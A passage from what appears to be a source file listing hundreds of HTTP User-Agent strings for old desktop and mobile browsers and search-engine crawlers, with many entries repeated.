               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
